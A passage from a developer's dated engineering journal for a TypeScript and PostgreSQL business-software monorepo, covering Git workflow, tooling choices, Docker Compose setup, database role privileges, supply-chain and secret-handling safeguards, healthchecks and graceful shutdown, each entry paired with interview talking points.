- **What happened:** GitHub's "Authorize your device" page asked for an 8-character code, and I waited for it on my phone. It never comes there: `gh` prints it in the terminal ("First copy your one-time code: XXXX-XXXX"), and the browser had opened on top of it. Fix: `gh auth login --hostname github.com --git-protocol https --web --clipboard` copies the code to the clipboard.
- **Why / what I learned:** This is the OAuth device flow (RFC 8628), used by CLIs and smart TVs that can't show a login page. The device asks GitHub for a short code; I type it in a browser where I'm already logged in; GitHub links the two and gives the device a token. The page warns "never use a code sent by someone else" because entering an attacker's code would log *their* device into my account (device-code phishing).
- **Say it in an interview:** "CLI tools log in with the OAuth device flow: the code is generated on the device and approved in a browser session I already trust."
- **Follow-ups to expect:** Device flow vs the normal browser redirect flow? (Redirect needs the app to receive a callback; a CLI or TV can't, so it polls GitHub until I approve.)

### 2026-10-30 — `gh pr create --fill` named my first PR after the branch `#github` `#gotcha`
- **What happened:** Opened PR #1 with `gh pr create --fill`. With more than one commit on the branch, `--fill` used the branch name ("chore/p0.1 git workflow") as the title and a list of commits as the description, skipping the PR template. With squash merges that title would have become the commit message on `main`, breaking the Conventional Commits rule on the very first merge. Fixed the title and description on GitHub before merging, and switched the docs to `gh pr create --web`, which opens GitHub's form with the template loaded.
- **Why / what I learned:** Read what a tool's convenience flag actually does before putting it in a workflow. Looking at the PR before merging is exactly what the PR step is for.
- **Say it in an interview:** "With squash merges, the PR title *is* the commit message on main, so I treat the title as part of the change."
- **Follow-ups to expect:** How would you enforce PR titles automatically? (A CI check on the title; planned for P0.6.)

### 2026-10-30 — `.gitattributes` beats `core.autocrlf` `#git` `#gotcha`
- **What happened:** Found the cause of the "LF will be replaced by CRLF" warning: Git for Windows sets `core.autocrlf=true` in its system config. Added `.gitattributes` with `* text=auto eol=lf`. `git ls-files --eol` showed all 46 files were already LF, so `git add --renormalize .` changed nothing.
- **Why / what I learned:** `core.autocrlf` is a per-machine setting, so every clone could behave differently. `.gitattributes` is committed, so the rule travels with the repo and wins over local settings. `text=auto` lets Git skip binary files.
- **Say it in an interview:** "Line-ending policy lives in the repo, not in each developer's config."
- **Follow-ups to expect:** What breaks with CRLF on Linux? (`/bin/sh^M: bad interpreter` in shell scripts.)

### 2026-10-30 — Git workflow: GitHub flow, squash merges, Conventional Commits, protected `main` `#git` `#github` `#devops` → ADR 0017
- **What happened:** Decided: one task = one branch = one PR; squash merge only; Conventional Commits for commits and PR titles; a ruleset on `main` that requires a PR, blocks force-push and deletion, requires linear history and lets nobody bypass. Made the repo public instead of waiting for the Student Pack: protection and secret scanning are free on public repos, and recruiters need to see it anyway. Added a PR template with the project's checklist. Afterwards, checked the result through GitHub's API rather than trusting the web page: the ruleset is active and reports `current_user_can_bypass: never`, and secret scanning turned out to be still off, so it was switched on with `gh api -X PATCH`.
- **Why / what I learned:** GitHub flow fits deploy-on-merge; Git Flow's release branches are for versioned software. Two gotchas: GitHub won't let you approve your own PR, so a solo repo needs 0 required approvals (the PR is a CI gate and a self-review); and after a squash merge `git branch -d` says "not fully merged", because the branch's commits got new IDs on `main`, so delete with `-D` once the PR is merged.
- **Say it in an interview:** "`main` is protected even from me. Everything lands through a PR, squash-merged as one Conventional Commit, so the history reads like a changelog."
- **Follow-ups to expect:** Trunk-based development vs GitHub flow? (Trunk-based merges tiny changes into `main` many times a day, often behind feature flags; GitHub flow is the same idea with a PR per change.) How do you ship a hotfix? (Same flow: a `fix/` branch and a fast PR.)

### 2026-10-30 — The monorepo scaffold: one workspace, shared code first `#architecture` `#process`
- **What happened:** Set up a pnpm workspace (`apps/*`, `packages/*`) with one root config each for TypeScript, ESLint and Prettier, and `pnpm check` to run every check. Created only `packages/shared`. The web app and API folders come in P0.4/P0.5, generated by the Vite and NestJS tools, because empty placeholder apps would have been thrown away. `shared` is used straight from its TypeScript source (no build step); P0.4 checks that NestJS can load it. Tool versions live once in a pnpm *catalog*, so every package uses the same TypeScript and Vitest.
- **Why / what I learned:** Strict TypeScript flags are cheapest on day one. `noUncheckedIndexedAccess` already mattered in the first function: regex match groups come back as `string | undefined`, so the code must handle the missing case instead of assuming it. `shared` has `"types": []` and no DOM library, so Node-only or browser-only code there fails the type check: it has to run in both.
- **Say it in an interview:** "I set up the monorepo with one config per tool at the root and strict TypeScript from the first file, and I only created packages when they had real code."
- **Follow-ups to expect:** Why not Turborepo or Nx? (Plain pnpm is enough until builds get slow; ADR 0002.) What does `noUncheckedIndexedAccess` do? (Array and object lookups may be `undefined`, so you must check.)

### 2026-10-30 — "Latest" TypeScript broke the linter: read the peer warning `#gotcha` `#process`
- **What happened:** `pnpm add typescript` installed 7.0.2, the new compiler rewritten in Go. pnpm warned about an unmet peer dependency: typescript-eslint 8.72 supports TypeScript `>=4.8.4 <6.1.0`, because type-aware lint rules call the compiler's internal API, which 7.0 changed. Pinned TypeScript to `~6.0.3` in the catalog, with a comment saying why. `pnpm peers check` then reported nothing.
- **Why / what I learned:** A peer dependency is a package a plugin needs you to install in a version it supports. The warning is easy to scroll past, but here it meant the linter could have broken in confusing ways. `~6.0.3` allows 6.0.x patches only; `^` would have allowed 6.1, outside the supported range.
- **Say it in an interview:** "I don't install 'latest' blindly. When a peer range said my lint tooling didn't support the new major version, I pinned the newest supported one and left a note to upgrade later."
- **Follow-ups to expect:** `^` vs `~`? (`^1.2.3` allows any 1.x; `~1.2.3` allows 1.2.x.) Why is TypeScript 7 a big deal? (The Go port type-checks about 10x faster.)

### 2026-10-30 — Supply-chain guards from the first install `#security` `#devops`
- **What happened:** Set pnpm's `minimumReleaseAge` to 1440 minutes, so it only installs versions that have been public for at least a day. pnpm also blocks dependencies' install scripts unless approved, and none of ours needed one. The committed lockfile records the exact version and checksum of every package.
- **Why / what I learned:** Attackers who steal a maintainer's npm token publish a poisoned version of a popular package. Such versions are usually spotted and pulled within hours, so a one-day wait avoids most of them. Install scripts are the usual way the poison runs on a developer's machine.
- **Say it in an interview:** "Dependencies are code I didn't write, so I pin them with a lockfile, block install scripts by default, wait a day before taking new releases, and get Dependabot alerts."
- **Follow-ups to expect:** What's in a lockfile? (Exact resolved versions plus integrity hashes, so every install is identical.) What if you need a security fix within that day? (Install it explicitly; the wait is a default, not a lock.)

### 2026-10-30 — Proving the checks can fail `#testing` `#process`
- **What happened:** With the tools set up, every check passed, but a check that has never failed proves nothing. Planted one problem at a time: a type error (TS2322), `Buffer` in shared code (TS2591, because Node types are excluded), an `any` (`no-explicit-any`), an unawaited promise (`no-floating-promises`, which shows type-aware linting is really on), and bad formatting. Each command exited 1. Also found that Vitest 5 exits 1 when there are no test files, so `--passWithNoTests` was used until the first tests landed.
- **Why / what I learned:** It's the same lesson as the personal-data search that silently matched nothing in session 2. Test the tester: a misconfigured linter that lints zero files also reports "no problems".
- **Say it in an interview:** "Before trusting my CI checks, I planted a deliberate error for each one and watched it fail."
- **Follow-ups to expect:** What's type-aware linting? (Rules that use the compiler's type information, e.g. a promise that's never awaited.)

### 2026-10-30 — First money code, test-first, and the `0.29 * 100` trap `#money` `#testing` → ADR 0008
- **What happened:** Wrote `parseRupees("125.50") → 12550` and `formatPaise(12345678) → "₹1,23,456.78"` with TDD: the tests first, watched all 30 (then 12 more) fail with "is not a function", then the code. 42 tests pass. The tests include the floating-point traps: in JavaScript `0.29 * 100` is `28.999999999999996` and `1.1 * 100` is `110.00000000000001`. So `parseRupees` splits the text at the dot and multiplies only whole numbers. It refuses `1,250`, `₹125`, `12.555`, `-5`, `1e3` and Devanagari digits, returning `null` rather than guessing.
- **Why / what I learned:** Bad input from a person is expected, so it returns `null` and the screen asks again. A non-integer amount inside the code is a bug, so `formatPaise` throws a `RangeError`. Watching the test fail first proves it tests the thing you think it does.
- **Say it in an interview:** "Typed amounts never go through floating-point maths: I parse the text into integer paise and refuse anything ambiguous, because a guessed amount could silently save a wrong bill."
- **Follow-ups to expect:** Why `null` and not an exception? Why refuse commas? (A wrong guess is worse than asking again; Excel import will get its own rules.)

### 2026-10-30 — Lakh/crore grouping with `Intl`, without a float `#money` `#gotcha`
- **What happened:** `Intl.NumberFormat('en-IN', { style: 'currency', currency: 'INR' })` gives Indian grouping (`₹98,76,54,321.00`) and `-₹1,250.00` for negatives. Instead of `paise / 100`, `formatPaise` builds the decimal text `"123456.78"` from the digits and passes the string, which `format()` accepts exactly. TypeScript rejected that (TS2769): its types only accept strings it can prove are numbers (`` `${number}` ``), so the built-up string needs an `as` cast, with a comment. `-0` shows as `₹0.00`, not `-₹0.00`.
- **Why / what I learned:** The built-in `Intl` API knows each locale's rules, so no library is needed. The formatter is created once at module level, because building it on every call is slow.
- **Say it in an interview:** "Display goes through one helper that uses the en-IN locale for lakh/crore grouping, fed an exact decimal string so even display never touches a float."
- **Follow-ups to expect:** What about Hindi? (`hi-IN` uses the same Latin digits and grouping by default.)

### 2026-10-30 — Two scanner gotchas: a fake Aadhaar and a mangled path `#security` `#gotcha`
- **What happened:** The personal-data search flagged a test amount: twelve digits in a row look like an Aadhaar number. I changed the test value instead of learning to ignore the hit, because a false alarm on every commit trains you to skip real ones. Separately, gitleaks run from Git Bash failed with `stat C:/Program Files/Git/repo`: Git Bash rewrites arguments that look like Unix paths (`/repo`) into Windows paths. Running it from PowerShell, as `git-workflow.md` says, works.
- **Why / what I learned:** Keep alerts trustworthy by fixing false positives at the source. Git Bash (MSYS) path conversion can be turned off with `MSYS_NO_PATHCONV=1`.
- **Say it in an interview:** "If a check keeps raising false alarms, I fix the cause, because alert fatigue is how real problems get ignored."
- **Follow-ups to expect:** How would you handle false positives in CI? (A reviewed allowlist entry with a reason, never turning the check off.)

### 2026-10-30 — The final review caught a wrong assumption in my plan `#architecture` `#gotcha` `#process`
- **What happened:** A fresh reviewer checked the whole P0.2 branch. It tried about 60 hostile inputs on `parseRupees` and found no wrong amount. It did find that my plan claimed `shared`'s source "runs under Node without changes". It doesn't: `node` importing `src/index.ts` fails with `ERR_MODULE_NOT_FOUND … money.js`. Node 24 can strip TypeScript types itself, but it won't map an import of `./money.js` to `money.ts`. Vite and Vitest do that mapping, so the tests passed. I fixed the plan and wrote the finding into the P0.4 task: the API will need `shared` compiled (or bundled).
- **Why / what I learned:** "It works in the tests" only proves it works in the test runner. An assumption is a claim until something runs it. A reviewer with a fresh context catches what the author's context hides.
- **Say it in an interview:** "My shared package worked in Vite and Vitest, but a review showed Node can't load it from source, so I planned a compile step for the API before writing it, not after a failed deploy."
- **Follow-ups to expect:** How do monorepos share TypeScript between a bundled frontend and a Node backend? (Compile the shared package, use project references, or bundle the backend.)

### 2026-10-30 — A test that passes at once must still be shown to fail `#testing`
- **What happened:** Fixed the review's minor points. Two new tests (`-5` paise → `-₹0.05`, and `"\t125\n"` pasted from a spreadsheet → 12500) passed immediately, because the code already handled them. To prove they guard anything, I broke the code on purpose: dropped `Math.abs` so the minus sign landed inside the zero-padding, and made `trim` strip only spaces. Exactly those two tests failed, and the other 42 didn't notice. Then I restored the code. Also: the error for `2 ** 53` said "not a whole number", but it is whole, just past the safe range, so the message now says "safe whole number" (the test first, red, then the fix). And Prettier and ESLint no longer scan the scratch folder, and type-aware rules no longer trip on `.mjs` config files. Both were shown broken with a probe file first.
- **Why / what I learned:** This is mutation testing by hand: change the code the way a future bug would and check a test notices. A test that can't fail is decoration.
- **Say it in an interview:** "When a new test passes straight away, I break the code on purpose to make sure the test would catch that bug."
- **Follow-ups to expect:** What's mutation testing? (Tools like Stryker make many small code changes automatically and report which ones no test catches.)

### 2026-10-30 — ADR 0018: ESLint + Prettier, pnpm catalogs, supply-chain guards `#process` `#security` → ADR 0018
- **What happened:** Recorded the tooling chosen in P0.2 as an ADR. ESLint with typescript-eslint's type-aware rules plus Prettier won over Biome (much narrower type-aware checks) and over no linter (the compiler alone misses unawaited promises). A pnpm catalog keeps one version of each tool for every package. The lockfile is committed, install scripts are blocked by default, and new versions wait a day. TypeScript stays on `~6.0` until typescript-eslint supports 7.
- **Why / what I learned:** Even "just tooling" is a decision with trade-offs (speed vs depth of checks, newest vs supported). Writing it down stops it being re-argued, and records when to revisit it.
- **Say it in an interview:** "I chose type-aware linting because rules like no-floating-promises catch an unawaited database write, the kind of bug that loses a bill. For the supply chain: a lockfile, blocked install scripts, and a one-day wait on new releases."
- **Follow-ups to expect:** Why not Biome? When would you switch? (When its type-aware rules cover what we rely on, or lint time becomes a problem.)

### 2026-10-30 — DevOps stage 2: images, containers, volumes and Compose `#devops` `#database`
- **What happened:** Started PostgreSQL 18 with one command, `pnpm db:up` (`docker compose up -d --wait`). Docker pulled the `postgres:18` image (~55 s the first time), created a named volume `business-software_pgdata` and a container, and waited until its healthcheck passed. To prove the data lives in the volume and not the container, I created a marker table, ran `docker compose down` (which deletes the container), started again, and the row was still there. The owner said any DevOps tool is fine, with no course restrictions.
- **Why / what I learned:** The image is the recipe; the container is a disposable running copy; the volume is the part that must never be thrown away. `docker compose down` keeps volumes; `down -v` deletes them, which for a database means deleting the data. `--wait` makes the command return only when the service is healthy, so the next command can use it straight away.
- **Say it in an interview:** "My database runs in Docker Compose with its data in a named volume, so I can delete and recreate the container freely. The same image version runs in my tests and matches RDS."
- **Follow-ups to expect:** What's the difference between a bind mount and a named volume? (A bind mount maps a host folder, which I use read-only for the bootstrap SQL; a named volume is managed by Docker and is right for database files.)

### 2026-10-30 — PostgreSQL 18 moved its data folder in the Docker image `#devops` `#database` `#gotcha`
- **What happened:** Before writing `compose.yaml`, I checked the image docs. From PostgreSQL 18, the official image keeps its data in `/var/lib/postgresql/18/docker` and declares the volume at `/var/lib/postgresql`. Most tutorials still mount `/var/lib/postgresql/data`. I mounted the parent folder and checked `show data_directory` → `/var/lib/postgresql/18/docker`. My first write-up claimed the old mount would silently lose data. The final review corrected me: the current image's entrypoint detects a mount at the old path and **refuses to start**, with an explanation (I checked the script). With older images, or a custom `PGDATA`, the mismatch *can* silently put data in an anonymous volume.
- **Why / what I learned:** Copy-pasted config goes stale when a major version changes. Read the image's release notes, then verify on the running system. And verify your own explanation too: a confident wrong fact in an interview is worse than "I'd check".
- **Say it in an interview:** "With Postgres 18 the image's data path changed. I mounted the new path and verified the data directory and a restart. The image even refuses to start if you mount the old path, which is a nice fail-loud design."
- **Follow-ups to expect:** How would you upgrade Postgres 17 data to 18 in Docker? (`pg_dump`/restore or `pg_upgrade` into a new volume, keeping the old volume until the new one is verified.)

### 2026-10-30 — Two database roles, a bootstrap file and default privileges `#database` `#security` → ADR 0019
- **What happened:** A bootstrap SQL file, run once by an administrator, creates `app_owner` (runs migrations, owns tables) and `app_runtime` (what the app logs in as), plus the database. The first Drizzle migration runs `ALTER DEFAULT PRIVILEGES … GRANT SELECT, INSERT, UPDATE ON TABLES TO app_runtime`, so every future table gets those rights and never `DELETE`. psql's `\getenv` reads the passwords from environment variables, so they're never in git. Chose the `pg` driver (pg-boss uses it too), Drizzle 0.45 stable over the 1.0 release candidate, and the Debian image over Alpine (glibc like RDS, not musl; identical sorting will still need an ICU collation, P1.7).
- **Why / what I learned:** Table owners and superusers bypass Row-Level Security, so the app must not log in as the owner. Creating roles needs admin rights, which the migration role shouldn't have, so it lives outside migrations. Default privileges make "never grant DELETE" the default instead of something to remember.
- **Say it in an interview:** "The app's database user physically can't delete rows or change the schema. Migrations use a separate owner role. Grants come from default privileges, so a new table is safe without anyone remembering a GRANT."
- **Follow-ups to expect:** What about a table that should be insert-only, like an audit log? (Revoke UPDATE on that one table in its migration; P1.2.)

### 2026-10-30 — A healthcheck that says "ready" too early `#devops` `#gotcha`
- **What happened:** On first start, the Postgres image runs its init scripts (my bootstrap) on a temporary server that listens only on a Unix socket, then restarts. A plain `pg_isready` checks the socket, so it can report ready before the roles and database exist, and a migration run straight after would fail. The healthcheck uses `pg_isready -h 127.0.0.1` (TCP), which only answers after init has finished. Right after the first `pnpm db:up`, logging in as `app_owner` over TCP worked.
- **Why / what I learned:** "Container started" ≠ "service ready", and "ready" depends on what you check. A healthcheck should test what the next step needs.
- **Say it in an interview:** "My healthcheck connects over TCP, not the socket, because during first-start initialization the image's temporary server is socket-only. Otherwise `up --wait` could return before my roles exist."
- **Follow-ups to expect:** Difference between `depends_on` and a healthcheck? (`depends_on` with `condition: service_healthy` waits for the healthcheck; plain `depends_on` only waits for the container to start.)

### 2026-10-30 — Compose guards: required variables and a localhost-only port `#security` `#devops`
- **What happened:** Passwords are written as `${APP_RUNTIME_PASSWORD:?set APP_RUNTIME_PASSWORD in .env}`. With the variable missing, Compose refuses to start and names it, instead of creating a role with an empty password. The port is published as `127.0.0.1:5432:5432`. Without the IP, Docker listens on every network interface, so anyone on the same Wi-Fi could try to log in. `docker compose port db 5432` → `127.0.0.1:5432`.
- **Why / what I learned:** Fail loudly on missing config. Publish ports only where they're needed. Docker's port publishing can bypass the firewall rules people expect.
- **Say it in an interview:** "My compose file refuses to start without its secrets, and the database port is bound to localhost only."
- **Follow-ups to expect:** Where do secrets go in production? (SSM Parameter Store, read at deploy time; never in the image or the repo.)

### 2026-10-30 — Proving the database refuses: `42501`, not just "an error" `#testing` `#database`
- **What happened:** The integration test starts a throwaway `postgres:18` with Testcontainers, runs the same bootstrap file and migrations, then creates a table *after* the migrations. Before the grants migration existed, the insert/update test failed with `permission denied for table probe`: red for the right reason. With the migration, all 8 passed. The refusals (delete, truncate, create table, drop table, read migration history) assert SQLSTATE `42501` (insufficient privilege). An unrelated error, such as a misspelt table (`42P01`), would make the test fail instead of passing by accident. Then I planted `DELETE` into the grant: exactly the "refuses delete" test failed. The test reads the image from `compose.yaml`, so tests and local can't drift apart.
- **Why / what I learned:** A "should fail" test must check *why* it failed. A test that accepts any error passes on typos.
- **Say it in an interview:** "My tests assert the exact PostgreSQL error code for permission denied, and I planted a DELETE grant to confirm the test catches it."
- **Follow-ups to expect:** Why create the probe table after migrating? (To prove default privileges cover tables that don't exist yet, which is how real future tables will arrive.)

### 2026-10-30 — Small Windows and pnpm gotchas `#gotcha` `#security`
- **What happened:** (1) Windows PowerShell 5.1's `Set-Content -Encoding utf8` writes a byte-order mark (BOM). I rewrote `.env` without one, since some `.env` parsers read the BOM as part of the first variable's name. (2) pnpm 12 now *fails* `pnpm add` when dependencies' install scripts are blocked (`ERR_PNPM_IGNORED_BUILDS`). I denied the four explicitly (`allowBuilds: false` for esbuild, ssh2, cpu-features, protobufjs) with reasons in `pnpm-workspace.yaml`, because none is needed here. (3) The personal-data scan matched drizzle's all-zero placeholder UUID in a generated snapshot file: a false positive in a generated file. (4) A bash heredoc with apostrophes in it broke in the Windows shell tool; editing the file directly worked.
- **Why / what I learned:** Defaults differ between tool versions (PowerShell 5 vs 7, pnpm 10 vs 12). Blocking install scripts is only useful if every exception has a recorded reason.
- **Say it in an interview:** "pnpm blocks dependency install scripts by default. When it flagged four, I checked what each one does and denied all of them on the record."
- **Follow-ups to expect:** Why are install scripts dangerous? (They run arbitrary code on your machine at install time, which is how many npm supply-chain attacks work.)

### 2026-10-30 — The review found a test gap, and my first "red" was fake `#testing` `#gotcha` `#process`
- **What happened:** The final reviewer (a fresh context) checked all five risks from the plan on the live database and found no bugs. It did find gaps:
  - Deleting the sequence-grant line from migration `0000` would pass every test, because PostgreSQL doesn't check sequence rights for identity columns (it does for `serial`).
  - A forbidden extra grant like `TRIGGER` would also go unnoticed.
  - Two "facts" in my notes were wrong: the PG 18 mount claim, and "Debian sorts like RDS".

  I added a test that reads `pg_default_acl` and expects exactly `INSERT,SELECT,UPDATE` on tables and `SELECT,USAGE` on sequences. My first run of the two planted mutations "failed" as hoped, but the test also failed after I restored the file. The query itself was broken (`ORDER BY kind COLLATE "C"`: an output alias can't be used inside an expression), so it failed every time and proved nothing. After fixing the query: green on the real migration, and an `AssertionError` from exactly that test for each mutation. The other 8 tests didn't notice either mutation.
- **Why / what I learned:** A red test only counts if it's red *for the right reason*. Check the failure message, not just ✗. And behaviour tests can miss configuration that only matters for cases the test doesn't use (identity vs serial), so pin the configuration itself as well.
- **Say it in an interview:** "A reviewer showed a grant could vanish without any test failing, because identity columns don't check sequence privileges. I added a test that pins the exact grants and confirmed it with planted mutations. The first time, it failed for the wrong reason: a SQL error. I only trust a red test after reading why it's red."
- **Follow-ups to expect:** Identity vs serial? (Both use a sequence. `serial` is a default calling `nextval`, which checks the caller's sequence rights. Identity is built into the table, so inserting only needs the table's INSERT right.)

### 2026-10-30 — Secrets in a public repo: five leak paths, not one `#security` `#devops`
- **What happened:** The owner asked that the future Claude API key can never be read by GitHub users. `.gitignore` and gitleaks only cover git. I listed every way a secret leaks from a public project and gave each a rule in `docs/devops/secrets.md`:
  - git;
  - Docker image layers (anyone who pulls can run `docker history`);
  - the browser bundle (Vite inlines `VITE_*` variables);
  - CI (fork PRs, `pull_request_target`);
  - logs and error messages.

  In P0.4 I checked the image: no `.env`, and no secret in its environment or history.
- **Why / what I learned:** "Not in git" isn't "not public". Images, front-end bundles and logs are published too. A paid API key also gets a spend limit, so even a leak has a ceiling.
- **Say it in an interview:** "Secrets only arrive as environment variables when a container starts: never in an image layer, never in the browser bundle, never in a log line. The Claude key is read only by the API, lives in SSM, and has a spend limit at the provider."
- **Follow-ups to expect:** A secret got committed, what now? (Revoke it at the provider first; deleting the commit doesn't help because clones and forks keep it.)

### 2026-10-30 — Error objects can leak more than their message `#security` `#gotcha` `#database`
- **What happened:** A planted-error test printed an unhandled pg error, and Vitest's report showed its `client` field with `password: 'runtime-test'`. My first note said logging any pg error would leak the password. The final review showed that's too broad, and I checked it myself:
  - pg-pool attaches the client only to idle-connection errors;
  - pg defines `password` as a hidden (non-enumerable) property, so default `console.log`/`util.inspect` and `JSON.stringify` don't show it;
  - serializers that read hidden properties do show it: `util.inspect(e, { showHidden: true })`, `%o`, and test-runner or error-reporting tools.

  Two more problems:
  - Drizzle wraps the real reason in `error.cause`, so logging only `error.message` printed a useless "Failed query: CREATE SCHEMA…".
  - Drizzle's message ends with `params:` and the query's values, which from P1 will be phone numbers and session tokens.

  Fix: `describeError()` joins the messages along the `cause` chain, cuts each one at `params:`, and shows only the kind of a thrown non-Error. Every entry point goes through `runProcess()`, so even a startup crash is logged that way. All of it is tested.
- **Why / what I learned:** Libraries attach context to errors for debugging: connections, query values. Whether it's printed depends on the serializer, so log only fields you chose, and follow `cause` to keep the useful reason. Also, verify a security claim before writing it down.
- **Say it in an interview:** "I log only error messages, never error objects. pg-pool attaches the client to some errors, and its password is hidden but still printed by serializers that read hidden properties. Drizzle's messages also include query values, so I strip those. The log still says 'password authentication failed', just not the password or the customer's data."
- **Follow-ups to expect:** What is `Error.cause`? (A standard way to wrap a lower-level error inside a higher-level one, so you keep both.)

### 2026-10-30 — An unhandled `error` event crashes Node: the pool needs a handler `#backend` `#database` `#gotcha`
- **What happened:** When the database restarts, idle pooled connections die, and `pg` emits an `error` event on the pool. An `EventEmitter` with no `error` listener throws, which kills the whole process. A database blip would crash the API. `createDatabase(url, onPoolError)` makes the handler a required argument. A test kills the runtime role's connections with `pg_terminate_backend` and checks that the handler ran and the next query works. Removing the handler made the test fail with exactly that unhandled error.
- **Why / what I learned:** In Node, the `error` event is special: unhandled means crash. Making the safe thing required in the function signature beats remembering it.
- **Say it in an interview:** "My pool's error handler is a required parameter, because Node crashes on an unhandled `error` event, and pg raises one whenever the database drops an idle connection. A test kills connections from the server side to prove the API survives."
- **Follow-ups to expect:** What happens to queries during the outage? (They fail, and `/ready` returns 503. When the database is back, the pool opens new connections. Checked in Docker: no restart needed.)

### 2026-10-30 — Compile once, read source everywhere else: project references + export conditions `#architecture` `#backend` → ADR 0020
- **What happened:** Node couldn't run our TypeScript packages (known since P0.2), and NestJS needs a compiler anyway for decorator metadata. Each package now builds to `dist/` with `tsc -b` (project references build `shared` → `db` → `api` in order). Packages export a custom `source` condition pointing at `src/*.ts`. TypeScript (`customConditions`), ESLint and Vitest use it, so tests and lint need no build, and Node uses the `default` condition (`dist/*.js`). Checked by deleting every `dist/` and running `pnpm check`. `pnpm dev` runs `tsc -b -w` and `node --watch` together, restarting about 4 s after a save.
- **Why / what I learned:** Different tools can see different files through one `exports` map. Production should run compiled JavaScript, and fast feedback shouldn't need a build.
- **Say it in an interview:** "Tests and the editor read my packages' TypeScript through a custom export condition. Node reads compiled output. `tsc -b` builds them in dependency order."
- **Follow-ups to expect:** Why not bundle? (One more tool, esbuild can't emit decorator metadata, and stack traces point into a bundle.)

### 2026-10-30 — One image, three commands, and migrations first `#devops` `#database` → ADRs 0020, 0021
- **What happened:** A multi-stage Dockerfile on `node:24-slim`:
  - pnpm via Corepack;
  - `pnpm deploy --prod` copies the API with only its production dependencies, workspace packages included;
  - it runs as the non-root `node` user, with root-owned files.

  It's 375 MB, of which the app is 40 MB. Compose runs it three ways: `migrate` (one-shot, as `app_owner`), then `api` and `worker` (as `app_runtime`), which start only after `migrate` exits 0. With a wrong owner password, `migrate` exited 1 with "password authentication failed", and `api`/`worker` stayed `Created`. The first build took about 12 minutes on a very slow connection; later builds reuse the cached install layer.
- **Why / what I learned:** The schema must be upgraded before new code runs, by the only role allowed to change it. Manifests are copied before sources so the dependency layer stays cached.
- **Say it in an interview:** "One image, three commands. A one-shot migrate container upgrades the schema as the owner role, and the app containers depend on it completing successfully, so a failed migration stops the rollout before anything changes."
- **Follow-ups to expect:** What if the new code isn't compatible with the old schema during a deploy? (Keep migrations backwards-compatible: add first, remove in a later release.)

### 2026-10-30 — Liveness vs readiness `#devops` `#backend`
- **What happened:** `GET /api/health` returns 200 whenever the process answers. Docker's healthcheck uses it (via `node -e "fetch(...)"`, because the slim image has no curl). `GET /api/health/ready` runs `select 1` as `app_runtime` and returns 503 `{status: "error", database: "unreachable"}` if it fails, without leaking the reason to the caller. Tested with a real database, and with a URL to a closed port. In Docker, stopping the database gave 503 on `/ready` and 200 on `/health`, then 200 again after a restart, with no container restarts.
- **Why / what I learned:** A restart check that depends on the database would restart a healthy API during a database outage, again and again, fixing nothing.
- **Say it in an interview:** "Liveness answers 'should Docker restart me?', readiness answers 'should traffic come to me?'. Mixing them causes restart loops during an outage."
- **Follow-ups to expect:** Where does readiness get used? (By the deploy step and the reverse proxy later, to send traffic only to an instance that can serve it.)

### 2026-10-30 — My worker died after 10 seconds: signal listeners don't keep Node alive `#backend` `#devops` `#mistake` `#gotcha`
- **What happened:** In the first Docker run, the worker logged "started", then exited with "Warning: Detected unsettled top-level await", and Docker restarted it (restart count 1). It was waiting on `once(process, 'SIGTERM')`. A listener doesn't keep Node's event loop alive. The only thing that did was the pool's idle connection, which pg closes after 10 s, so Node exited (code 13) while still waiting. My host check had only waited 3 s.

  The fix: `waitForShutdown()` holds a long timer until the signal arrives. The test runs it in a child process (Node strips its types) and checks the process is still running a second later. The first red was for the wrong reason: a broken `C:/C:/` path on Windows. After fixing the path, red with exit 13; after the fix, green. 20 s later in Docker: 0 restarts.
- **Why / what I learned:** Node exits when nothing is pending, regardless of pending promises. Observe longer than the system's slowest timer. Read why a test is red.
- **Say it in an interview:** "My worker exited after exactly 10 seconds, which matched pg's idle timeout. Waiting for a signal doesn't keep Node's event loop alive, so once the pool's last socket closed, the process ended. I reproduced it in a test, held the process open with a timer until SIGTERM, and verified it in Docker."
- **Follow-ups to expect:** Exit code 13? (Node's code for a top-level await that never settled.)

### 2026-10-30 — Graceful shutdown: exit 0, not 143 `#devops` `#backend` → ADR 0020
- **What happened:** `docker compose stop` gave the worker exit 0 but the API 143. NestJS's `enableShutdownHooks()` closes the app and then re-raises SIGTERM, so the process ends "killed by signal" (128 + 15). It was still graceful (0.7 s, not a 10 s kill). I switched the API to the same `waitForShutdown()` + `app.close()` as the worker: both now exit 0 in about 0.7 s. Compose uses `init: true`, so a tiny init process is PID 1 and forwards signals.
- **Why / what I learned:** `docker stop` sends SIGTERM and kills after 10 s. A process that ignores it loses in-flight work. Exit codes are signals to monitoring, so a clean stop should be 0.
- **Say it in an interview:** "On SIGTERM my processes stop taking work, finish what's open, close the database pool and exit 0 in under a second. Docker would otherwise SIGKILL them after 10 seconds."
- **Follow-ups to expect:** Why does PID 1 matter? (The kernel gives PID 1 special signal handling, with no default actions, so a program not written for it may ignore SIGTERM. An init process avoids that.)

### 2026-10-30 — pg-boss needs DDL and DELETE, so it gets its own sandbox role `#database` `#security` → ADR 0022
- **What happened:** Before deciding how the job queue fits "the app can't delete", I read pg-boss 12.38's SQL. It creates tables while running (per-queue partitions, stats partitions) and deletes finished jobs. None of its functions are `SECURITY DEFINER`, so the caller needs those rights. Decision: a third role, `app_queue`, owns only schema `pgboss`; the business-data role can't touch it, and it can't read business tables. Built in P2.7.
- **Why / what I learned:** Read what a library actually does to the database before granting it rights. Docs often don't mention run-time DDL.
- **Say it in an interview:** "My queue library needs to create tables and delete rows by design, so it runs as a separate role sandboxed in its own schema. The 'never delete business data' rule stays true, and the permanent record of each message lives in an outbox table."
- **Follow-ups to expect:** Why not just grant DELETE on the queue tables to the app role? (pg-boss also creates tables at run time, which that role can't do, and its upgrades would become hand-written migrations.)

### 2026-10-30 — Drizzle 0.x silently skips out-of-order migrations `#database` `#git` `#gotcha` → ADR 0021
- **What happened:** If two branches each add a migration and the one with the older timestamp merges second, Drizzle 0.x never applies it, without any error. Rule in `git-workflow.md`: rebase a migration PR on `main` before merging, and regenerate it if `main` got a newer one. A CI check is a candidate for P0.6.
- **Why / what I learned:** Migration tools differ on ordering. Know which one you have before two branches race.
- **Say it in an interview:** "Drizzle applies migrations by timestamp and skips older ones silently, so my workflow makes a migration PR the newest before it merges."
- **Follow-ups to expect:** How do other tools handle it? (Some refuse out-of-order migrations with an error, some apply them. Either is safer than silent.)

### 2026-10-30 — The final review: crashes that skipped my own logging rule `#process` `#security` `#devops`
- **What happened:** A fresh reviewer re-ran all five risks live and found no critical bugs, but three things worth fixing before P1 copies the pattern:
